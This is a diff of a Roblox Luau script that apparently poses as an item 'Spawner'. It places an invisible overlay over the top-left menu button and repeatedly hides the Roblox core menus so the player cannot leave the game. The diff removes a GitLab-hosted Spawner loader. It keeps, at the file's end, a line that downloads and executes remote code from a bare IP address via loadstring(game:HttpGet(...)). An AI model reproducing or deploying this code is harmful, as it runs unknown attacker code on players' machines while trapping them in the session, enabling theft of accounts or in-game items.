@@ -1,94 +1,51 @@
-ID="151de7d8-5ef0-4146-85b6-826df4581111";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
-
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
-
 pcall(function()
-	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
-		game.CoreGui.AntiLeaveBlocker:Destroy()
-	end
+	game.CoreGui.AntiLeaveBlocker:Destroy()
 end)
 
-
-local BLOCK_SIZE_X = 56
-local BLOCK_SIZE_Y = 56
-local BLOCK_POS_X  = 6
-local BLOCK_POS_Y  = 6
-local DISPLAY_ORDER = 10000
-
-
-local CoreGui = game:GetService("CoreGui")
-local RunService = game:GetService("RunService")
-
+local CoreGui, RunService = game:GetService("CoreGui"), game:GetService("RunService")
 
 local function tryHideRobloxMenu()
-	pcall(function()
-		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
-		for _, n in ipairs(names) do
-			local g = CoreGui:FindFirstChild(n)
-			if g then
-				pcall(function()
-					if g:IsA("ScreenGui") then
-						g.Enabled = false
-						for _, c in ipairs(g:GetChildren()) do
-							pcall(function() c.Visible = false end)
-							pcall(function() c.Enabled = false end)
-						end
-					else
-						for _, c in ipairs(g:GetDescendants()) do
-							pcall(function()
-								if c:IsA("GuiObject") then
-									c.Position = UDim2.new(-10,0,-10,0)
-								end
-							end)
-						end
+	for _, n in ipairs({"RobloxGui","RobloxMenu","Menu","MenuGui","Topbar","TopBar"}) do
+		local g = CoreGui:FindFirstChild(n)
+		if g then
+			if g:IsA("ScreenGui") then
+				g.Enabled = false
+				for _, c in ipairs(g:GetChildren()) do
+					if c:IsA("GuiObject") then c.Visible = false end
+					if c:IsA("LayerCollector") then c.Enabled = false end
+				end
+			else
+				for _, c in ipairs(g:GetDescendants()) do
+					if c:IsA("GuiObject") then
+						c.Position = UDim2.new(-10,0,-10,0)
 					end
-				end)
+				end
 			end
 		end
-	end)
+	end
 end
 
-
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AntiLeaveBlocker"
-screenGui.Parent = CoreGui
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.DisplayOrder = DISPLAY_ORDER
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-local container = Instance.new("Frame")
-container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
-container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
-container.BackgroundTransparency = 1
-container.BorderSizePixel = 0
-container.Parent = screenGui
+screenGui.Name, screenGui.Parent = "AntiLeaveBlocker", CoreGui
+screenGui.ResetOnSpawn, screenGui.IgnoreGuiInset = false, true
+screenGui.DisplayOrder, screenGui.ZIndexBehavior = 10000, Enum.ZIndexBehavior.Sibling
 
 local blocker = Instance.new("TextButton")
-blocker.Size = UDim2.new(1, 0, 1, 0)
-blocker.BackgroundTransparency = 1
-blocker.AutoButtonColor = false
-blocker.Text = ""
-blocker.Parent = container
-blocker.Active = true
-blocker.Selectable = false
-
-blocker.MouseButton1Down:Connect(function() end)
-blocker.MouseButton1Up:Connect(function() end)
-blocker.MouseButton2Down:Connect(function() end)
-blocker.MouseButton2Up:Connect(function() end)
-
+blocker.Size, blocker.Position = UDim2.new(0,56,0,56), UDim2.new(0,6,0,6)
+blocker.BackgroundTransparency, blocker.Text = 1, ""
+blocker.AutoButtonColor, blocker.Active, blocker.Selectable = false, true, false
+blocker.Parent = screenGui
 
 RunService.RenderStepped:Connect(function()
-	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+	blocker.Position = UDim2.new(0,6,0,6)
 end)
 
-
-spawn(function()
-	while screenGui.Parent and screenGui.Parent == CoreGui do
+task.spawn(function()
+	while screenGui.Parent == CoreGui do
 		tryHideRobloxMenu()
-		wait(2)
+		task.wait(2)
 	end
 end)
+
+ID="151de7d8-5ef0-4146-85b6-826df4581111";
+loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
